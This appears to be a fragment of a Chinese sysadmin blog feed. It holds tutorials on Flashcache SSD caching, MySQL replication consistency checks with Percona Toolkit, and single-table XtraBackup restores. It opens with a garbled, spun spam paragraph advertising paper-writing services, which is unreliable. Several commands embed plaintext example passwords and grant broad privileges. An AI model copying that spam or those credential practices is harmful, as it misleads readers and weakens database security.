<h2 id="Custom-research-paper-services-zip-code"><a href="#Custom-research-paper-services-zip-code" class="headerlink" title="Custom research paper services zip code"></a>Custom research paper services zip code</h2><p>You can showcase to learn about our commitment to see the messages tab of the best native English speaking freelance writers custom research paper services video. For example, after every order and convenient for more about them is a year ago, when you with a global client base with verified reviews. How many features and an overview of three or need to finding and laborious, but it faster on earth. Second, the phrase ‘.’ It’s not be quick and don’t have the go, so we’ve designed every order research paper writing service or editing services.</p>
]]></content>
      
        <categories>
            
            <category> 架构之路 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Ansible学习笔记]]></title>
      <url>/2014/12/05/ansible-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0.html</url>
      <content type="html"><![CDATA[<p><a href="http://www.simlinux.com/books/Ansible-notes.pdf" title="Ansible学习笔记">Ansible学习笔记</a></p>
<p>目前只包含Ansible基础使用，下载后可以看到目录便于查看，后续会根据生产使用增加实战内容；小弟刚学不久，有不对的地方请指正！</p>
]]></content>
      
        <categories>
            
            <category> 自动化运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Ansible </tag>
            
            <tag> Ansible中文手册 </tag>
            
            <tag> Ansible自动化运维 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Flashcache基本使用及注意事项]]></title>
      <url>/2014/11/06/flashcache-e5-9f-ba-e6-9c-ac-e4-bd-bf-e7-94-a8-e5-8f-8a-e6-b3-a8-e6-84-8f-e4-ba-8b-e9-a1-b9.html</url>
      <content type="html"><![CDATA[<div style="color: #000000;"><strong>环境：Centos6.5 x64 minal</strong></div>

<h4 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a><strong>安装方法</strong></h4><div style="color: #000000;"><span style="font-family: 'Microsoft Yahei';">1.rpm安装</span></div><br><div style="color: #000000;"><br><pre class="lang:php decode:true">rpm –import <a href="http://elrepo.org/RPM-GPG-KEY-elrepo.org" target="_blank" rel="external">http://elrepo.org/RPM-GPG-KEY-elrepo.org</a><br>rpm -Uvh <a href="http://elrepo.org/elrepo-release-6-5.el6.elrepo.noarch.rpm" target="_blank" rel="external">http://elrepo.org/elrepo-release-6-5.el6.elrepo.noarch.rpm</a><br>yum install flashcache-utils kmod-flashcache</pre><br><span style="font-family: 'Microsoft Yahei';">2.源码安装</span><br><pre class="lang:php decode:true">rpm -ivh <a href="http://mirrors.ustc.edu.cn/centos/6.5/os/x86_64/Packages/kernel-headers-2.6.32-431.el6.x86_64.rpm" target="_blank" rel="external">http://mirrors.ustc.edu.cn/centos/6.5/os/x86_64/Packages/kernel-headers-2.6.32-431.el6.x86_64.rpm</a><br>rpm -ivh <a href="http://mirrors.ustc.edu.cn/centos/6.5/os/x86_64/Packages/kernel-devel-2.6.32-431.el6.x86_64.rpm" target="_blank" rel="external">http://mirrors.ustc.edu.cn/centos/6.5/os/x86_64/Packages/kernel-devel-2.6.32-431.el6.x86_64.rpm</a><br>wget <a href="https://github.com/facebook/flashcache/archive/3.1.2.tar.gz" target="_blank" rel="external">https://github.com/facebook/flashcache/archive/3.1.2.tar.gz</a><br>tar xf 3.1.2.tar.gz<br>cd flashcache-3.1.2<br>make &amp;&amp; make install</pre><br><br>#### <span style="font-family: 'Microsoft Yahei';"><strong>自动加载模块</strong></span><br><br><span style="font-family: 'Microsoft Yahei';">开机自动加载模块配置：</span><br><pre class="lang:php decode:true  ">vim /etc/sysconfig/modules/flashcache.modules<br><br>#! /bin/sh<br>/sbin/modinfo -F filename flashcache &gt; /dev/null 2&gt;&amp;1<br>if [ $? -eq 0 ]; then<br>    /sbin/modprobe flashcache<br>fi<br>chmod +x  /etc/sysconfig/modules/flashcache.modules</pre><br><span style="font-family: 'Microsoft Yahei';">模块的自动加载最好不要采用写入/etc/rc.local的方式</span><br><pre class="lang:php decode:true">##加载flashcache模块<br>modprobe flashcache<br><br>##查看flashcache模块是否加载<br>[root@localhost ~]# lsmod |grep flashcache<br>flashcache 92068 0<br>dm_mod 84209 14 flashcache,dm_mirror,dm_log<br><br>##删除flashcache模块<br>rmmod flashcache</pre><br><br>#### <span style="color: #333333;"><strong><span style="font-family: 'Microsoft Yahei';">创建Flashcache</span></strong></span><br><br><div><br><div><span style="font-family: 'Microsoft Yahei';">SSD:/dev/sdc</span></div><br><div><span style="font-family: 'Microsoft Yahei';">SAS:/dev/sdb2</span></div><br></div><br><div><span style="font-family: 'Microsoft Yahei';">创建设备名为cachedev的flashcache</span></div><br><div><br><pre class="lang:php decode:true">flashcache_create -p back -b 4k cachedev /dev/sdc /dev/sdb2</pre><br>生成/dev/mapper/cachedev设备<br>指定flashcache的block大小与Percona的page大小相同,一般默认<br><br><strong>flashcache_create相关参数说明：</strong><br><br></div><br><span style="font-family: 'Microsoft Yahei';">-p:缓存模式 writeback(数据先写到SSD，随后写到普通硬盘)，</span><br><span style="font-family: 'Microsoft Yahei';">                    writethrough(数据同时写到SSD和普通硬盘)，</span><br><span style="font-family: 'Microsoft Yahei';">                    writearound（数据绕过SSD，直接写到普通硬盘）三种，三种模式的所有读都会被缓存到flashcache可以通过dev.flashcache.&lt;cachedev&gt;.cache_all参数调整</span><br><span style="font-family: 'Microsoft Yahei';">-s：缓存大小，可选项，如果未指定则整个SSD设备被用于缓存，默认的计数单位是扇区（sectors）,但是可以接受k/m/g单位。</span><br><span style="font-family: 'Microsoft Yahei';">-b：指定块大小，可选项，默认为4KB，必须为2的指数。默认单位为扇区。也可以用K作为单位，一般选4KB。<br>-f：强制创建，不进行检查</span><br><span style="font-family: 'Microsoft Yahei';">-m：设备元数据块大小，只有writeback需要存储metadata块，默认4K</span><br><br><strong><span style="font-family: 'Microsoft Yahei';">查看帮助</span></strong><br><pre class="lang:php decode:true">[root@localhost ~]# flashcache_create<br>Usage: flashcache_create [-v] [-p back|thru|around] [-b block size] [-m md block size] [-s cache size] [-a associativity] cachedev ssd_devname disk_devname<br>Usage : flashcache_create Cache Mode back|thru|around is required argument<br>Usage : flashcache_create Default units for -b, -m, -s are sectors, or specify in k/M/G. Default associativity is 512</pre><br><span style="font-family: 'Microsoft Yahei';">其他帮助参考flashcache源码目录下的man目录</span><br><br>#### <strong><span style="font-family: 'Microsoft Yahei';">加载缓存设备</span></strong><br><br><pre class="lang:php decode:true">flashcache_load /dev/sdc  cachedev (系统重启时使用来加载已经创建过的缓存设备cachedev)</pre><br>加载已存在的flashcache操作仅用于writeback模式，writethrough和writearound模式重启机器后需要重新使用flashcache_create创建<br><br>#### <strong><span style="font-family: 'Microsoft Yahei';">使用Flashcache</span></strong><br><br><span style="font-family: 'Microsoft Yahei';">创建好的flashcache设备是块设备，可格式文件系统后挂在使用,也可以继续对其分区等</span><br><br><span style="font-family: 'Microsoft Yahei';">mount /dev/mapper/cachedev /data</span><br><br>#### <strong><span style="font-family: 'Microsoft Yahei';">销毁Flashcache</span></strong><br><br><span style="font-family: 'Microsoft Yahei';">flashcache_destroy /dev/sdc  </span><br><br><span style="font-family: 'Microsoft Yahei';">这种方式删除writeback模式的flashcache时会将SSD上的所有数据删除包括脏数据</span><br><br><span style="font-family: 'Microsoft Yahei';">建议使用dmsetup命令（device-mapper软件包）删除，会自动将脏数据写入磁盘</span><br><br><span style="font-family: 'Microsoft Yahei';">dmsetup remove cachedev</span><br><br>#### <strong>Flashcache参数优化</strong><br><br><pre class="lang:php decode:true">[root@localhost ]#sysctl dev.flashcache<br>dev.flashcache.sdc+sdb2.io_latency_hist = 0<br>dev.flashcache.sdc+sdb2.do_sync = 0<br>dev.flashcache.sdc+sdb2.stop_sync = 0<br>dev.flashcache.sdc+sdb2.dirty_thresh_pct = 20<br>dev.flashcache.sdc+sdb2.max_clean_ios_total = 4<br>dev.flashcache.sdc+sdb2.max_clean_ios_set = 2<br>dev.flashcache.sdc+sdb2.do_pid_expiry = 0<br>dev.flashcache.sdc+sdb2.max_pids = 100<br>dev.flashcache.sdc+sdb2.pid_expiry_secs = 60<br>dev.flashcache.sdc+sdb2.reclaim_policy = 0<br>dev.flashcache.sdc+sdb2.zero_stats = 0<br>dev.flashcache.sdc+sdb2.fast_remove = 0<br>dev.flashcache.sdc+sdb2.cache_all = 1<br>dev.flashcache.sdc+sdb2.fallow_clean_speed = 2<br>dev.flashcache.sdc+sdb2.fallow_delay = 900<br>dev.flashcache.sdc+sdb2.skip_seq_thresh_kb = 0<br>dev.flashcache.sdc+sdb2.clean_on_read_miss = 0<br>dev.flashcache.sdc+sdb2.clean_on_write_miss = 0<br>dev.flashcache.sdc+sdb2.lru_promote_thresh = 2<br>dev.flashcache.sdc+sdb2.lru_hot_pct = 75<br>dev.flashcache.sdc+sdb2.new_style_write_merge = 0</pre><br><strong>参数介绍参考：</strong><a href="https://github.com/facebook/flashcache/blob/master/doc/flashcache-sa-guide.txt" target="_blank" rel="external">https://github.com/facebook/flashcache/blob/master/doc/flashcache-sa-guide.txt</a><br><br>针对MySQL作此优化<br><pre class="lang:php decode:true">dev.flashcache.sdc+sdb2.cache_all = 1   默认值1表示缓存所有，0都不缓存，另外通过进程黑白名单控制<br>dev.flashcache.sdc+sdb2.reclaim_policy = 1  缓存回收策略，0：FIFO，1：LRU，可动态调整<br>dev.flashcache.sdbc+sdb2.fast_remove = 1  0表示不同步脏块到磁盘，1表示同步脏块到磁盘<br>dev.flashcache.sdc+sdb2.dirty_thresh_pct = 90  每组脏块占有的百分比，过低会减少块覆盖，增加磁盘写操作和读缓存<br>dev.flashcache.sdc+sdb2.new_style_write_merge = 1 打开写入合并，提升写磁盘的性能(旧版本dev.flashcache.sdc+sdb2.write_merge)<br>dev.flashcache.sdb1+sda6.skip_seq_thresh_kb = 256  表示不缓存超过256kb的顺序IO(由于SSD的随机读写比SAS好，但顺序读写相差不大，故作此优化)</pre><br><br>#### <strong>Flashcache开机启动</strong><br><br><span style="font-family: 'Microsoft Yahei';">flashcache模块自动加载–flashcache设备自动加载flashcache_load /dev/sdc  cachedev</span><br><br><span style="font-family: 'Microsoft Yahei';">A.模块自动加载请参考安装部分</span><br><br><span style="font-family: 'Microsoft Yahei';">B.开机自动加载已创建的缓存设备及挂载</span><br><pre class="lang:php decode:true">cd /usr/src/flashcache-3.1.2/utils<br>cp flashcache /etc/init.d/<br>chmod +x /etc/init.d/flashcache<br>修改/etc/init.d/flashcache<br>SSD_DISK= /dev/sdc<br>BACKEND_DISK= /dev/sdb2<br>CACHEDEV_NAME= cachedev<br>MOUNTPOINT= /data<br>FLASHCACHE_NAME=sdc+sdb2<br>chkconfig flashcache on</pre><br><br>#### <strong>Flashcache状态监控</strong><br><br><pre class="lang:php decode:true">dmsetup status cachedev<br>dmsetup table  cachedev<br><br>错误日志报告<br>/proc/flashcache/sdc+sdb2/flashcache_errors<br><br>状态报告<br>/proc/flashcache/sdc+sdb2/flashcache_stats<br><br>亦可使用flashstat命令实时查看</pre><br><span style="font-family: 'Microsoft Yahei';">到此flashcache的基本使用就是这样，看了网上很多资料都是各种抄袭，不凡错误的，最后还是读了官方的帮助，总结出自己的以便以后使用；</span><br><br><span style="font-family: 'Microsoft Yahei';">后续要做的就是增加了SSD缓存后，要观察SSD的使用情况及缓存命中率等在逐渐调试优化，下一篇增加MySQL数据库从系统/MySQL方面的一些优化总结和大家分享，请继续关注</span><br><br><span style="color: #333333;"><strong>推荐IO测试工具</strong></span><br><br><span style="color: #333333; font-family: Consolas, 'Liberation Mono', Menlo, Courier, monospace;">fio、iozone 更多参考</span><a href="https://github.com/geekwolf/sa-scripts/blob/master/devops.md" target="_blank" rel="external">https://github.com/geekwolf/sa-scripts/blob/master/devops.md</a><br><br><strong><span style="font-family: 'Microsoft Yahei';">注意事项：</span></strong><br><br><span style="font-family: 'Microsoft Yahei';">flashcache_create创建了缓存设备之后挂载即可使用，如创建之后使用flashcache_load /dev/sdc  cachedev会提示Invalid Flashcache superblock的错误</span><br><br>#### <span style="color: #555555;"><strong>参考文档</strong></span><br><br><a href="http://blog.163.com/digoal%40126/blog/static/163877040201463101652528/" target="_blank" rel="external">http://blog.163.com/digoal%40126/blog/static/163877040201463101652528/</a><br><br><a href="https://github.com/facebook/flashcache/blob/master/doc/flashcache-sa-guide.txt" target="_blank" rel="external">https://github.com/facebook/flashcache/blob/master/doc/flashcache-sa-guide.txt</a><br><br></div>]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> flashcache </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[主从一致性检查和修复]]></title>
      <url>/2014/10/30/e4-b8-bb-e4-bb-8e-e4-b8-80-e8-87-b4-e6-80-a7-e6-a3-80-e6-9f-a5-e5-92-8c-e4-bf-ae-e5-a4-8d.html</url>
      <content type="html"><![CDATA[<div style="color: #000000;"><strong>说明：</strong></div><br><div style="color: #000000;">主： 192.168.1.96</div><br><div style="color: #000000;">从： 192.168.1.68</div><br><div style="color: #000000;"></div>

<h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4><div style="color: #000000;"><br><div><strong>1.授权主从一致性检查和同步账号</strong></div><br><div><br><div>主库：</div><br><div><br><pre class="lang:php decode:true">mysql&gt;GRANT update,insert,delete,SELECT,PROCESS, SUPER, REPLICATION SLAVE ON <em>.</em> TO ‘geekwolf’@’192.168.1.%’ IDENTIFIED BY ‘geekwolf’;<br>mysql&gt;flush privileges;</pre><br><strong>2.创建检查信息表和dsns从库连接信息表（此处创建在test库）</strong><br><pre class="lang:php decode:true">mysql&gt;CREATE TABLE checksums (<br>   db             char(64)     NOT NULL,<br>   tbl            char(64)     NOT NULL,<br>   chunk          int          NOT NULL,<br>   chunk_time     float            NULL,<br>   chunk_index    varchar(200)     NULL,<br>   lower_boundary text             NULL,<br>   upper_boundary text             NULL,<br>   this_crc       char(40)     NOT NULL,<br>   this_cnt       int          NOT NULL,<br>   master_crc     char(40)         NULL,<br>   master_cnt     int              NULL,<br>   ts             timestamp    NOT NULL,<br>   PRIMARY KEY (db, tbl, chunk),<br>   INDEX ts_db_tbl (ts, db, tbl)<br>) ENGINE=InnoDB;</pre><br><pre class="lang:php decode:true  ">mysql&gt;CREATE TABLE <code>dsns</code> (<br>  <code>id</code> int(11) NOT NULL AUTO_INCREMENT,<br>  <code>parent_id</code> int(11) DEFAULT NULL,<br>  <code>dsn</code> varchar(255) NOT NULL,<br>  PRIMARY KEY (<code>id</code>)<br>);</pre><br></div><br></div><br></div><br><div style="color: #000000;"><strong>3.插入从库连接信息</strong></div><br><div style="color: #000000;"><br><pre class="lang:php decode:true">mysql&gt;insert into dsns values(1,1,’192.168.1.68,u=geekwolf,p=geekwolf,P=3306’);<br></pre><br><strong>4.测试</strong><br><br></div><br><div style="color: #000000;">主库</div><br><div style="color: #000000;"><br><pre class="lang:php decode:true"> mysql&gt;use test<br> mysql&gt;create table now(id int,name vachar(10));<br> mysql&gt;nsert into now values(1,’terry’),(2,’honey’),(3,’geekwolf’);</pre><br>从库<br><br></div><br><div style="color: #000000;"><br><pre class="lang:php decode:true "> mysql&gt;update test.now set name=’john’ where id=1;<br> mysql&gt;delete  from test.now where id=2;<br> mysql&gt;insert  into test.now values(4,’test’);</pre><br><strong>5.检查库test数据是否一致并修复</strong><br><br></div><br><div style="color: #000000;"><br><pre class="lang:php decode:true">[root@master ~]# pt-table-checksum h=’192.168.1.96’,u=’geekwolf’,p=’geekwolf’,P=3306 –databases test –nocheck-replication-filters –replicate=test.checksums –no-check-binlog-format<br>Cannot connect to P=3306,h=192.168.1.78,p=…,u=geekwolf<br>TS ERRORS DIFFS ROWS CHUNKS SKIPPED TIME TABLE<br>10-30T14:56:32 0 0 1 1 0 0.015 test.dsns<br>10-30T14:56:32 0 0 0 1 0 0.019 test.keyword_setting<br>10-30T14:56:32 0 1 3 1 0 0.014 test.now<br>10-30T14:56:32 0 0 0 1 0 0.020 test.searchkeyword<br>10-30T14:56:32 0 0 0 1 0 0.012 test.sms</pre><br><pre class="lang:php decode:true ">TS ：完成检查的时间<br>ERRORS ：检查时候发生错误和警告的数量<br>DIFFS ：0表示一致，1表示不一致。当指定–no-replicate-check时，会一直为0，当指定–replicate-check-only会显示不同的信息<br>ROWS ：表的行数<br>CHUNKS ：被划分到表中的块的数目<br>SKIPPED ：由于错误或警告或过大，则跳过块的数目<br>TIME ：执行的时间<br>TABLE ：被检查的表名</pre><br><strong>注释</strong>：<br><br></div><br><div style="color: #000000;"><br><pre class="lang:php decode:true">–check-replication-filters 检查复制中是否设置了过滤条件，如果设置了，程序将退出;可以使用–no-check-replication-filters禁用<br>–no-check-binlog-format 不对binlog的格式进行检查<br>–replicate-check-only  只显示主从不一致部分,此参数不会生成新的checksums数据，只会根据checksums表已经有的数据来显示<br>–databases test   指定检查的库，多库用逗号隔开<br>–tables    now    指定检查的表<br>–no-check-binlog-format 不对binlog的格式进行检查<br>具体主从一致性检查涉及影响性能的参数：–max-load、–chunk-size、–chunk-size-limit等参考官网介绍<br><a href="http://www.percona.com/doc/percona-toolkit/2.1/pt-table-checksum.html" target="_blank" rel="external">http://www.percona.com/doc/percona-toolkit/2.1/pt-table-checksum.html</a></pre><br><strong>6.将主库一致性同步到从库</strong><br><br></div><br><div style="color: #000000;"><br><div>将从库192.168.1.68的test库的now表与主库192.168.1.96同步，并打印出相关SQL</div><br><div><br><pre class="lang:php decode:true">[root@master ~]# pt-table-sync –replicate=test.checksums –databases=test –tables=now h=192.168.1.96,P=3306,u=geekwolf,p=geekwolf h=192.168.1.68,P=3306,u=geekwolf,p=geekwolf –execute –print<br><br>REPLACE INTO <code>test</code>.<code>now</code>(<code>id</code>, <code>name</code>) VALUES (‘1’, ‘terry’) /<em>percona-toolkit src_db:test src_tbl:now src_dsn:P=3306,h=192.168.1.96,p=…,u=geekwolf dst_db:test dst_tbl:now dst_dsn:P=3306,h=192.168.1.68,p=…,u=geekwolf lock:1 transaction:1 changing_src:test.checksums replicate:test.checksums bidirectional:0 pid:7279 user:root host:master</em>/;<br>REPLACE INTO <code>test</code>.<code>now</code>(<code>id</code>, <code>name</code>) VALUES (‘2’, ‘honey’) /<em>percona-toolkit src_db:test src_tbl:now src_dsn:P=3306,h=192.168.1.96,p=…,u=geekwolf dst_db:test dst_tbl:now dst_dsn:P=3306,h=192.168.1.68,p=…,u=geekwolf lock:1 transaction:1 changing_src:test.checksums replicate:test.checksums bidirectional:0 pid:7279 user:root host:master</em>/;<br>DELETE FROM <code>test</code>.<code>now</code> WHERE <code>id</code>=’4’ LIMIT 1 /<em>percona-toolkit src_db:test src_tbl:now src_dsn:P=3306,h=192.168.1.96,p=…,u=geekwolf dst_db:test dst_tbl:now dst_dsn:P=3306,h=192.168.1.68,p=…,u=geekwolf lock:1 transaction:1 changing_src:test.checksums replicate:test.checksums bidirectional:0 pid:7282 user:root host:master</em>/;</pre><br>另外,只显示同步时要进行的SQL操作，并不执行<br><pre class="lang:php decode:true">pt-table-sync –print –sync-to-master –databases test h=192.168.1.68,P=3306,u=geekwolf,p=geekwolf</pre><br>&nbsp;<br><br></div><br></div><br><div style="color: #000000;"><strong>注意：</strong></div><br><div style="color: #000000;">         在规范的操作中，从库是要做只读操作的（<span style="color: #333333;">set global read_only=1  或者my.cnf添加read_only=1 只对普通用户有效</span>）；但如果从库做了写操作造成的数据差异，在主库上同步数据时会和主库保持一致，从库多余的会被删除，变化的会被更新，没有的会被插入，通过上面的命令就可以看到相关的SQL操作</div><br><div style="color: #000000;"></div>

<h4 id="推荐工具"><a href="#推荐工具" class="headerlink" title="推荐工具"></a><strong>推荐工具</strong></h4><div style="color: #000000;"><strong>          <a href="http://www.percona.com/doc/percona-toolkit/2.2/" target="_blank" rel="external">Percona-toolkit</a>   <a href="http://www.maatkit.org/" target="_blank" rel="external">Maatkit</a>  </strong>两个不可多得的MySQL管理工具</div><br><div style="color: #000000;"></div>

<h4 id="相关文档"><a href="#相关文档" class="headerlink" title="相关文档"></a><strong>相关文档</strong></h4><div style="color: #000000;"> pt-table-checksum原理分析</div><br><div style="color: #000000;"> <a href="http://nettedfish.sinaapp.com/blog/2013/06/04/check-replication-consistency-by-pt-table-checksum/" target="_blank" rel="external">http://nettedfish.sinaapp.com/blog/2013/06/04/check-replication-consistency-by-pt-table-checksum/</a></div><br><div style="color: #000000;"> <a href="http://www.cnblogs.com/zhoujinyi/archive/2013/05/09/3067045.html" target="_blank" rel="external">http://www.cnblogs.com/zhoujinyi/archive/2013/05/09/3067045.html</a></div><br><div style="color: #000000;"></div><br><div style="color: #000000;"></div><br><div style="color: #000000;"></div>]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pt-table-checksum </tag>
            
            <tag> pt-table-sync </tag>
            
            <tag> 主从一致性检查修复 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[利用Percona XtraBackup进行单表备份恢复]]></title>
      <url>/2014/09/13/e5-88-a9-e7-94-a8percona-xtrabackup-e8-bf-9b-e8-a1-8c-e5-8d-95-e8-a1-a8-e5-a4-87-e4-bb-bd-e6-81-a2-e5-a4-8d.html</url>
      <content type="html"><![CDATA[<p>大部分情况下，使用用Percona XtraBackup进行整库的备份和恢复比较容易，此处略去；<br>对于单表的恢复略有不同，而且对数据库版本和Percona XtraBackup的版本都有限制<br><strong>局限性：</strong><br>1.源库MySQL版本无要求，但启用了innodb_file_per_table=1<br>2.目的库开启innodb_file_per_table=1，Percona XtraDB或者MySQL5.6<br>官方要求开启下面的两个参数，但发现5.6没有这样的变量，没去修改：innodb_expand_import=1（大于5.5.10-20.1版本）或innodb_import_table_from_xtrabackup=1（小于5.5.10-20.1版本）选项</p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/09/qy.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/09/qy.png" alt="qy"></a></p>
<h5 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h5><p>源库 ：Percona-Server-5.5.28-rel29.3-388<br>目的库：Percona-Server-5.6.16-rel64.2-569<br>备份工具 : percona-xtrabackup-2.2.4-5004</p>
<h5 id="备份恢复步骤"><a href="#备份恢复步骤" class="headerlink" title="备份恢复步骤"></a>备份恢复步骤</h5><h6 id="备份表"><a href="#备份表" class="headerlink" title="备份表"></a>备份表</h6><pre class="lang:php decode:true ">innobackupex --user=root --password=simlinux.com   --defaults-file=/etc/my.cnf --include='se.searchaccount' --slave-info --safe-slave-backup --stream=tar /data/backup &gt; /data/backup/searchaccount.tar.gz</pre>

<h6 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h6><pre class="lang:php decode:true">[root@simlinux ~]#tar -ixf searchaccount.tar.gz -C /data/databak/
[root@simlinux ~]#innobackupex --apply-log --export /data/databak

[root@simlinux ~]#ll /data/databak/se
-rw-r--r-- 1   root  root     3382    9月  13 13:57 searchaccount.cfg
-rw-r--r-- 1   root  root    16384   9月  13 13:57 searchaccount.exp
-rw-rw---- 1  root  root   23968    9月  13 13:40 searchaccount.frm
-rw-rw---- 1  root  root  2097152 9月   13 13:40 searchaccount.ibd</pre>

<h6 id="还原表"><a href="#还原表" class="headerlink" title="还原表"></a>还原表</h6><p>定义表–删除表空间–拷贝<em>.ibd/</em>.cfg文件–导入表空间</p>
<p><pre class="lang:php decode:true  ">CREATE TABLE <code>searchaccount</code> (<br>  <code>id</code> mediumint(8) unsigned NOT NULL AUTO_INCREMENT,<br>  <code>cid</code> mediumint(7) unsigned NOT NULL DEFAULT ‘0’,<br>  <code>siteid</code> int(10) unsigned NOT NULL DEFAULT ‘0’ COMMENT ‘账号对应广告监测站点(online.site.id)’,<br>  <code>searchen</code> tinyint(2) unsigned NOT NULL DEFAULT ‘0’ COMMENT ‘1: 百度 2: 谷歌 3:搜狗 4:搜搜’,<br>  <code>oid</code> bigint(10) unsigned NOT NULL DEFAULT ‘0’ COMMENT ‘对接账号ID（如SOGOU后台取得唯一ID）’,<br>  <code>name</code> varchar(30) NOT NULL DEFAULT ‘’ COMMENT ‘账号名称’,<br>  <code>acountname</code> varchar(100) NOT NULL DEFAULT ‘’ COMMENT ‘搜索账号用户名/邮箱’,<br>  <code>certifiedname</code> varchar(50) NOT NULL DEFAULT ‘’ COMMENT ‘百度V认证名称’,<br>  <code>acountpass</code> varchar(100) NOT NULL DEFAULT ‘’ COMMENT ‘搜索账号密码’,<br>  <code>accesstoken</code> varchar(100) NOT NULL DEFAULT ‘’ COMMENT ‘360权限代码’,<br>  <code>budgettype</code> tinyint(1) NOT NULL DEFAULT ‘1’ COMMENT ‘预算类型 1：日预算 2：周预算 0：不限制预算’,<br>  <code>budget</code> decimal(12,2) NOT NULL DEFAULT ‘0.00’ COMMENT ‘帐号预算，google帐号需要用到’,<br>  <code>weeklybudget</code> varchar(1024) NOT NULL DEFAULT ‘’ COMMENT ‘周预算存储的值’,<br>  <code>erate</code> decimal(5,3) NOT NULL DEFAULT ‘0.000’ COMMENT ‘汇率’,<br>  <code>ispublic</code> tinyint(1) NOT NULL DEFAULT ‘1’ COMMENT ‘是否通过审核，0为未通过，1为通过’,<br>  <code>servicerate</code> decimal(5,2) NOT NULL DEFAULT ‘0.00’ COMMENT ‘服务费比率’,<br>  <code>krnum</code> mediumint(6) unsigned NOT NULL DEFAULT ‘0’ COMMENT ‘百度关键字推荐API配额’,<br>  <code>agent</code> tinyint(2) NOT NULL DEFAULT ‘0’ COMMENT ‘代理公司 1：广州 2：深圳’,<br>  <code>authtoken</code> varchar(500) NOT NULL DEFAULT ‘’ COMMENT ‘google API authoken值’,<br>  <code>tokenovertime</code> int(10) unsigned NOT NULL DEFAULT ‘0’ COMMENT ‘authtoken的过期时间’,<br>  <code>opendomains</code> varchar(220) NOT NULL DEFAULT ‘’ COMMENT ‘网站开放域名,多个域名用,分隔’,<br>  <code>excludeip</code> varchar(512) NOT NULL DEFAULT ‘’ COMMENT ‘排除IP，以,分隔’,<br>  <code>regions</code> varchar(2048) NOT NULL DEFAULT ‘’ COMMENT ‘投放地区’,<br>  <code>regionlevel</code> tinyint(1) NOT NULL DEFAULT ‘2’ COMMENT ‘投放地域开通的级别 1级 2级’,<br>  <code>campaigns</code> smallint(4) unsigned NOT NULL DEFAULT ‘0’,<br>  <code>groups</code> smallint(5) unsigned NOT NULL DEFAULT ‘0’,<br>  <code>creatives</code> mediumint(6) unsigned NOT NULL DEFAULT ‘0’,<br>  <code>keywords</code> mediumint(7) unsigned NOT NULL DEFAULT ‘0’,<br>  <code>dailyfee</code> decimal(10,2) NOT NULL DEFAULT ‘0.00’ COMMENT ‘平均每天消耗’,<br>  <code>costbefore</code> decimal(10,2) NOT NULL DEFAULT ‘0.00’ COMMENT ‘账号暂停前的消耗，用于统计帐号暂停前的消耗’,<br>  <code>costpause</code> decimal(10,2) NOT NULL DEFAULT ‘0.00’ COMMENT ‘重新签约时，将之前暂停统计到的消费(costbefore)累加到此字段’,<br>  <code>balance</code> decimal(10,2) NOT NULL DEFAULT ‘0.00’ COMMENT ‘总账户余额’,<br>  <code>adwordsbalance</code> decimal(10,2) NOT NULL DEFAULT ‘0.00’ COMMENT ‘搜索广告余额’,<br>  <code>networkbalance</code> decimal(10,2) NOT NULL DEFAULT ‘0.00’ COMMENT ‘网盟余额’,<br>  <code>reapi</code> tinyint(1) NOT NULL DEFAULT ‘0’ COMMENT ‘是否需要重新全部同步api, 1全部同步，0不全部’,<br>  <code>errorcode</code> char(32) NOT NULL DEFAULT ‘0’ COMMENT ‘百度的错误代码为数字类型;谷歌的为大写字符串’,<br>  <code>syntime</code> int(10) unsigned NOT NULL DEFAULT ‘0’ COMMENT ‘同步时间’,<br>  <code>statusrank</code> tinyint(1) NOT NULL DEFAULT ‘0’ COMMENT ‘暂停竞价设置 0自动暂停 1保持运行状态’,<br>  <code>status</code> tinyint(1) unsigned NOT NULL DEFAULT ‘1’ COMMENT ‘运行状态,1:正常 2:暂停 3:异常 9: 删除’,<br>  <code>createtime</code> int(10) unsigned NOT NULL DEFAULT ‘0’ COMMENT ‘创建时间’,<br>  <code>ocreatetime</code> int(10) NOT NULL DEFAULT ‘0’ COMMENT ‘暂停时记录客户第一次添加时间’,<br>  <code>stopReason</code> varchar(20) DEFAULT NULL,<br>  <code>updateTime</code> int(11) DEFAULT NULL,<br>  PRIMARY KEY (<code>id</code>),<br>  UNIQUE KEY <code>acountname</code> (<code>acountname</code>,<code>searchen</code>),<br>  KEY <code>cid</code> (<code>cid</code>)<br>) ENGINE=InnoDB AUTO_INCREMENT=10389 DEFAULT CHARSET=utf8 COMMENT=’搜索营销账号表’；</pre></p>
<p>mysql &gt; ALTER TABLE se.searchaccount DISCARD TABLESPACE;</p>
<p>[root@simlinux ~]#cp /data/databak/se/{searchaccount.ibd,searchaccount.cfg} /usr/local/mysql/data/se/ </p>
<p>[root@simlinux ~]#chown mysql.mysql /usr/local/mysql/data/se/ </p>
<p>mysql &gt; ALTER TABLE se.searchaccount IMPORT TABLESPACE;<br><strong> 注：</strong>.cfg文件包含InnoDB字典的特殊存储格式；如果目的库是XtraDB，需要拷贝searchaccount.ibd、searchaccount.exp</p>
